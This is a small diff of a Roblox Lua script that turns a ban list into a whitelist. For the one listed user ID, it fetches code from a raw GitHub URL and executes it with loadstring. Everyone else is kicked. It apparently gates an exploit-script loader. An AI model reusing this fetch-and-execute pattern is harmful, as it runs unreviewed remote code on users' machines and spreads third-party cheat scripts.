@@ -1,9 +1,9 @@
-Bannlisted = {
-   7492170322,
+whitelisted = {
+   7492170322
 }
 
 
-if table.find (Bannlisted, game:GetService("Players").LocalPlayer.UserId) then
+if table.find (whitelisted, game:GetService("Players").LocalPlayer.UserId) then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/S3nKeTsu/Lua3/main/Lua1"))()
 else
   game.Players.LocalPlayer:Kick("\nYou are not whitelisted from script Owner!!...")
